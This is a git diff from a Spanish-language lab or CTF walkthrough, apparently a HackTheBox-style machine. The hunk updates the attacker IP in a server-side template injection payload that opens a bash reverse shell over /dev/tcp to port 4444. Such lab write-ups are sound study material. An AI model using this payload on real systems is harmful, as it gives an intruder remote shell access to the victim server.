@@ -115,7 +115,7 @@ Con **Wappalyzer** se ejecuta **Python** por lo que parece una vulnerabilidad **
 Es vulnerable a **SSTI** por lo que realizamos un payload que contiene una Reverse Shell.
 
 ```
-{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.16.8/4444 0>&1"').read() }}
+{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.14/4444 0>&1"').read() }}
 ```
 
 Nos ponemos en escucha.
